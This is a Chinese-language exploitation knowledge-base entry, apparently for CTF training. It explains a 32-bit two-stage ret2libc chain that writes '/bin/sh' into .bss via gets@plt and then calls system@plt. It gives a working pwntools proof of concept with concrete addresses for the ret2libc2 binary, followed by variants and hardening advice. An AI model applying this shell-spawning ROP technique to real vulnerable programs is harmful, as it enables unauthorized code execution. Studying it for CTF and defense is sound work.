---
id: binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage
title: ret2libc 无 /bin/sh 字符串：先用 gets@plt 写入 bss 再 system@plt 两阶段链
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2libc-gets-bss-binsh-two-stage
aliases:
- ret2libc2
- 没有 /bin/sh 怎么办
- gets 写 bss 再 system
- pop ebx 清理参数
- 两阶段 ret2libc
- system@plt 无字符串
tags:
- pwn
- stack
- ret2libc
- rop
- gets
- bss
- 32bit
- cdecl
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V117
  verified_at: '2026-11-06T01:45:00+08:00'
  notes: 已对照原文核对：ret2libc2 案例 s[100] 位于 ebp-0x64，偏移 108+4=112；gets@plt=0x08048460、system@plt=0x08048490、pop_ebx=0x0804843d、buf2=0x804a080 与原文 exp 一致；链序 [padding][gets_plt][pop_ebx][buf2][system_plt][fake_ret][buf2] 正确，pop ebx 仅消耗 gets 参数栈槽、system 参数仍走 [esp+4]。未验证点：未复跑 exp；无受影响版本/CVE；frontmatter 无 sources/source_url。
---

## 一句话结论

32 位程序开启 NX、存在栈溢出且导入了 `system@plt`，但二进制和已知 libc 里都找不到 `/bin/sh` 字符串时，可以构造两阶段 ROP：第一次返回 `gets@plt` 把 `/bin/sh` 写进可写的 `.bss`（如 `buf2`），再用 `pop ebx; ret` 清理 `gets` 的参数并返回到 `system@plt`，以 `buf2` 作为参数执行 `system("/bin/sh")`。

## 原理

- NX 只禁止执行栈上的数据，不禁止调用已有可执行代码；`system@plt` 是程序导入的现成跳板，可以直接返回到它。
- `system` 需要第一个参数指向 `/bin/sh` 字符串。若二进制中没有该字符串，可以把字符串写到任意可写地址（`.bss`/`.data`），再把该地址作为 `system` 的参数。
- 32 位 cdecl 调用约定下，函数参数通过栈传递：调用 `gets(buf2)` 时，`gets` 从 `[esp+4]` 取参数；`gets` 返回时执行 `ret`，栈顶是 ROP 链里紧跟其后的返回地址。
- 链布局 `[padding][gets_plt][pop_ebx][buf2][system_plt][fake_ret][buf2]` 的执行过程：
  1. 函数返回跳到 `gets@plt`，此时栈顶是 `pop_ebx`（gets 的返回地址），下一个是 `buf2`（gets 的参数）；
  2. `gets` 读取一行到 `buf2`，返回后跳到 `pop_ebx`；
  3. `pop ebx` 把第一个 `buf2` 弹入 ebx（仅用于消耗这个栈槽），`ret` 跳到 `system@plt`；
  4. 此时 `system` 的返回地址是 `fake_ret`，第一个参数是第二个 `buf2`，即刚写入的 `/bin/sh`。
- 第一次发送 ROP 链后，程序会在 `gets` 处等待输入，所以第二次发送 `"/bin/sh"`；顺序不能颠倒。

## 触发条件

- 32 位 ELF，存在可覆盖返回地址的栈溢出（案例 `char s[100]`，偏移 112）。
- NX 开启，但 `system@plt` 存在（程序调用过 `system`）或能通过 GOT 泄露得到 libc 基址。
- 二进制/目标 libc 中找不到 `/bin/sh` 字符串，或字符串地址不可用。
- 存在可写的 `.bss`/`.data` 地址（案例 `buf2 = 0x804a080`）和一个 `pop ebx; ret` gadget。

## 利用步骤

1. 计算缓冲区到返回地址的偏移：案例 `s[100]` 位于 `ebp-0x64`，到 EBP 为 108 字节，加 4 字节 saved EBP，偏移 112。
2. 确认 `gets@plt`、`system@plt`、`pop ebx; ret` 与可写 `buf2` 地址。
3. 构造第一阶段 payload：`b"A"*112 + p32(gets_plt) + p32(pop_ebx) + p32(buf2) + p32(system_plt) + b"bbbb" + p32(buf2)`。
4. 发送 payload；程序返回后进入 `gets(buf2)`，再发送 `"/bin/sh"`。
5. `gets` 返回后经 `pop ebx` 清理参数并跳到 `system@plt`，执行 `system(buf2)`，获取 shell。
6. 若失败，检查 32/64 位调用约定、`pop` gadget 是否只弹一个寄存器、`system` 入口栈对齐以及 `buf2` 是否可写。

## PoC

```python
from pwn import *

sh = process("./ret2libc2")

gets_plt    = 0x08048460
system_plt  = 0x08048490
pop_ebx     = 0x0804843d
buf2        = 0x0804a080
offset      = 112

payload = flat([
    b"a" * offset,
    gets_plt,       # 返回到 gets
    pop_ebx,        # gets 的返回地址
    buf2,           # gets 的参数：把 /bin/sh 写到这里
    system_plt,     # pop_ebx; ret 后跳到 system
    b"bbbb",        # system 的伪返回地址
    buf2,           # system 的参数：指向 /bin/sh
])

sh.sendline(payload)
sh.sendline("/bin/sh")
sh.interactive()
```

说明：`pop_ebx` 在这些 32 位链中用于消耗 `gets` 的参数栈槽，`ebx` 本身不是 `system` 的参数；`system` 的第一个参数仍从 `[esp+4]` 读取。

## 变体与关联

- 变体：用 `read@plt` 代替 `gets` 时，需要额外布置 `fd=0`、`buf2`、`count` 三个参数，常配合 `pop edx; pop ecx; pop ebx; ret` 或 `pop esi; pop edi; pop ebp; ret` 等 gadget。
- 变体：64 位程序使用 `pop rdi; ret` 传参；若没有 `/bin/sh`，可先用 `gets@plt` 写入 bss，再 `pop rdi; ret; buf2; system`。
- 变体：`.bss` 不可写或地址含 `\x00` 时，改用 `.data`、堆地址或已知可写的 libc 段。
- 变体：若 `system@plt` 不存在，先用 `puts(puts@got)` 泄露 libc 基址，再计算 `system` 与 `/bin/sh`（或写入 `/bin/sh`）地址，形成完整 ret2libc。
- 关联：[[binary-pwn-stack-ret2libc]]（通用 ret2libc）、[[binary-pwn-stack-ret2syscall-32bit]]（系统调用链）、[[binary-pwn-stack-ret2text-win-plus-one-align]]（ret2text 与栈对齐）。

## 检测与防御

- 防御：开启 NX、PIE、Canary、Full RELRO；用 `-D_FORTIFY_SOURCE=2` 并将 `gets` 替换为 `fgets`/`read` 等有界函数。
- 防御：编译时启用 `-fstack-protector-strong`、`-Wl,-z,relro,-z,now`；对高风险二进制做 CFI/ROP 缓解。
- 检测：崩溃栈中出现 `gets@plt`/`system@plt` 交替的 ROP 链、`.bss` 中出现 `/bin/sh` 字符串、异常 `pop ebx; ret` 执行序列。
- 响应：定位溢出点与输入路径，检查是否有同类未受限字符串函数；审计二进制保护配置并重新编译。
